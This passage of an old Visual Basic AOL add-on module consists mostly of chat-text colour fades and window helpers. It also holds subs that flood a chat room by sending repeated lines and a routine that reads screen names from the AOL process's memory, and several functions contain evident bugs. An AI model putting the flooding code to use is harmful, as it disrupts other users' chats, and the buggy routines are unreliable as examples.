If Color1 = "Purple" Then Color1 = "800080"
If Color1 = "Black" Then Color1 = "000000"

If Color2 = "Navy" Then Color2 = "000080"
If Color2 = "Maroon" Then Color2 = "800000"
If Color2 = "Lime" Then Color2 = "00FF00"
If Color2 = "Teal" Then Color2 = "008080"
If Color2 = "Red" Then Color2 = "F0000"
If Color2 = "Blue" Then Color2 = "0000FF"
If Color2 = "Siler" Then Color2 = "C0C0C0"
If Color2 = "Yellow" Then Color2 = "FFFF00"
If Color2 = "Aqua" Then Color2 = "00FFFF"
If Color2 = "Purple" Then Color2 = "800080"
If Color1 = "Black" Then Color2 = "000000"

If Color3 = "Navy" Then Color3 = "000080"
If Color3 = "Maroon" Then Color3 = "800000"
If Color3 = "Lime" Then Color3 = "00FF00"
If Color3 = "Teal" Then Color3 = "008080"
If Color3 = "Red" Then Color3 = "F0000"
If Color3 = "Blue" Then Color3 = "0000FF"
If Color3 = "Siler" Then Color3 = "C0C0C0"
If Color3 = "Yellow" Then Color3 = "FFFF00"
If Color3 = "Aqua" Then Color3 = "00FFFF"
If Color3 = "Purple" Then Color3 = "800080"
If Color1 = "Black" Then Color3 = "000000"

If Color4 = "Navy" Then Color4 = "000080"
If Color4 = "Maroon" Then Color4 = "800000"
If Color4 = "Lime" Then Color4 = "00FF00"
If Color4 = "Teal" Then Color4 = "008080"
If Color4 = "Red" Then Color4 = "F0000"
If Color4 = "Blue" Then Color4 = "0000FF"
If Color4 = "Siler" Then Color4 = "C0C0C0"
If Color4 = "Yellow" Then Color4 = "FFFF00"
If Color4 = "Aqua" Then Color4 = "00FFFF"
If Color4 = "Purple" Then Color4 = "800080"
If Color1 = "Black" Then Color4 = "000000"

Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"
Do While numspc2% <= lenth2%
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Loop
wavytalker = newsent2$
End Function
Function WhitePurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    WhitePurpleWhite = Msg
End Function


Sub Window_Close(win)
'This will close and window of your choice
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub


Sub Window_Hide(hwnd)
'This will hide the window of your choice
X = showwindow(hwnd, SW_HIDE)
End Sub




Sub Window_Show(hwnd)
'This will show the window of your choice
X = showwindow(hwnd, SW_SHOW)
End Sub


Function Yellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Yellow_LBlue_Yellow = Msg
End Function

Function YellowBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function YellowBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function YellowGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function YellowPinkYellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    YellowPink = Msg
End Function


Function YellowPurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function




Function YellowRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function YellowRedYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function
Sub Form_Center(f As Form)
    f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
    f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = sendmessagebynum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = sendmessagebynum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Wavy(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & r$ & "</sup>" & U$ & "<sub>" & s$ & "</sub>" & T$
Next W
SendChat (p$)
End Function


Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)
GetWinText% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function


Sub AddRoomToListBox(ListBox As ListBox)
'AddRoomToListBox List1
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
If person$ = UserSN Then GoTo Na
ListBox.AddItem person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Public Sub SCROLLsixteenline(txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.7
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.7
End Sub
Public Sub SCROLLthirtyfiveline(txt As TextBox)
A = String(116, Chr(4))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$
Timeout 0.3
End Sub


Public Sub SCROLLtwentyfiveline(txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + ""
Timeout 1.5

End Sub
Public Sub SCROLLtwentyline(txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
End Sub
Function BoldAOL4_WavColors(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
SendChat (p$)
End Function
Sub BoldWavY(TheText)

G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & r$ & "<B></sup>" & U$ & "<sub>" & s$ & "</sub>" & T$
Next W
BoldSendChat (p$)
End Sub


Sub BoldWavyChatBlueBlack(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorbluegree(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorredandblack(TheText)

G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorredandblue(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub

Function BoldWhitePurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    WhitePurpleWhite (Msg)
End Function


Function BoldYellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldYellowBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldYellowBlackYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldYellowBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldYellowBlueYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldYellowGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldYellowGreenYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldYellowPinkYellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function


Function BoldYellowPurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldYellowPurpleYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldYellowRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function



Function BoldYellowRedYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function DBlue_Black_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 450 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    DBlue_Black_DBlue = Msg
End Function


Function DescrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Descrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
char$ = char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(char$, 1, Len(char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
Scrambled$ = Scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
Scrambled$ = Scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = Scrambled$

End Function
Function DGreen_Black(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    DGreen_Black = Msg
End Function
Sub Directory_Create(DiR)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
MkDir DiR
End Sub
Sub Directory_Delete(DiR)
'This deletes a directory automatically from your HD
RmDir (DiR)
End Sub

Function EliteText4IM(Word$)
Made$ = ""
For q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "s"
    If letter$ = "t" Then leet$ = "t"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "§"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next q

EliteText4IM = Made$

End Function
'Form back color fade codes begin here
'Works best when used in the Form_Paint() sub


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub


Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub


Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub


Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub falling_form(Frm As Form, steps As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
BgColor = Frm.BackColor
Frm.BackColor = RGB(0, 0, 0)
For X = 0 To Frm.Count - 1
Frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
Frm.Show
X = ((Screen.Width - Frm.Width) - Frm.Left) / steps
Y = ((Screen.Height - Frm.Height) - Frm.Top) / steps
Do
    Frm.Move Frm.Left + X, Frm.Top + Y
Loop Until (Frm.Left >= (Screen.Width - Frm.Width)) Or (Frm.Top >= (Screen.Height - Frm.Height))
Frm.Left = Screen.Width - Frm.Width
Frm.Top = Screen.Height - Frm.Height
Frm.BackColor = BgColor
For X = 0 To Frm.Count - 1
Frm.Controls(X).Visible = True
Next X
End Sub
Sub File_Delete(file)
'This will delete a file straight from the users HD
Kill (file)
End Sub

Sub File_Open(file)
